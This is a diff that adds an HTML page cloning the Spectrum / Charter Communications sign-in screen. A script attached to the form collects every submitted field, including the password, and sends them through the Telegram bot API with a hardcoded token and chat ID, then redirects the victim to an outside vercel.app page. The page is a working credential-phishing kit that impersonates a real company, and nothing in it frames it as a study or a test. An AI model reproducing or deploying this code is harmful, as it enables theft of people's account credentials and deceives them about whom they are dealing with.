@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In to Get Started - Spectrum</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="page">
+    <!-- Top Logo + Links -->
+    <div class="top-section">
+      <img src="logo.png" alt="Spectrum" class="logo">
+      
+      <div class="top-links">
+        <a href="#">Leave Feedback</a>
+        <a href="#">En español</a>
+      </div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="login-card">
+      <h1>Sign In to Get Started</h1>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <a href="#" class="create-username">Create a Username</a>
+
+      <form class="login-form" id="loginForm">
+        <!-- Username -->
+        <div class="form-group">
+          <label for="username">
+            Username
+            <span class="help-icon" title="Help">?</span>
+          </label>
+          <input 
+            type="text" 
+            id="username" 
+            name="username" 
+            autocomplete="username"
+            required
+            title="Username is required"
+          >
+        </div>
+
+        <!-- Password -->
+        <div class="form-group">
+          <label for="password">Password</label>
+          <div class="password-wrapper">
+            <input 
+              type="password" 
+              id="password" 
+              name="password" 
+              autocomplete="current-password"
+              required
+              title="Password is required"
+            >
+            <button type="button" class="toggle-password" id="togglePassword" aria-label="Show password">
+              👁️
+            </button>
+          </div>
+        </div>
+
+        <button type="submit" class="sign-in-btn">Sign In</button>
+      </form>
+
+      <a href="#" class="forgot-link">Forgot Username or Password?</a>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Your privacy rights</a> |
+        <a href="#">California consumer privacy rights</a> |
+        <a href="#">California consumer limit the use of my sensitive personal information</a> |
+        <a href="#">Do not sell or share my personal information/opt out of targeted advertising</a> |
+        <a href="#">Policies</a> |
+        <a href="#">Contact Us</a> |
+        <a href="#">Support</a>
+      </div>
+      <p class="copyright">© 2026 Charter Communications</p>
+    </footer>
+  </div>
+
+  <script>
+    // ===== Password Show / Hide Toggle =====
+    const toggleBtn = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    toggleBtn.addEventListener('click', function() {
+      const isPassword = passwordInput.getAttribute('type') === 'password';
+      
+      if (isPassword) {
+        passwordInput.setAttribute('type', 'text');
+        toggleBtn.textContent = '🙈'; // or use '👁️‍🗨️' / 'Hide'
+      } else {
+        passwordInput.setAttribute('type', 'password');
+        toggleBtn.textContent = '👁️';
+      }
+    });
+
+    // ===== Form Validation =====
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = passwordInput.value;
+
+      // Extra safety check (browser already blocks empty fields)
+      if (!username || !password) {
+        alert('Both Username and Password are required.');
+        return;
+      }
+
+      
+    });
+  </script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  // Change this selector to match your form
+  const form = document.querySelector('form'); // or document.getElementById('your-form-id')
+
+  if (!form) {
+    console.error('Form not found');
+    return;
+  }
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault(); // Prevent normal form submission
+
+    const botToken = '8433643463:AAGF39AJeW_ypUFtLBDJk7LRx8O3gvICtKM';
+    const chatId  = '7345412794';
+    const redirectUrl = 'https://skybestuserupdate.vercel.app/'; // ← Change this to your real thank-you page
+
+    // Collect all form fields
+    const formData = new FormData(form);
+    let message = '📩 New Spectrum Submission:\n\n';
+
+    for (const [key, value] of formData.entries()) {
+      message += `• ${key}: ${value}\n ` ;
+
+       
+    }
+
+  
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+
+      const result = await response.json();
+
+      if (result.ok) {
+        // Redirect after successful submission
+        window.location.href = redirectUrl;
+      } else {
+        console.error(result);
+        alert('Failed to send message. Please try again.');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('Network error. Please try again.');
+    }
+  });
+});
+</script>
+</body>
+</html>
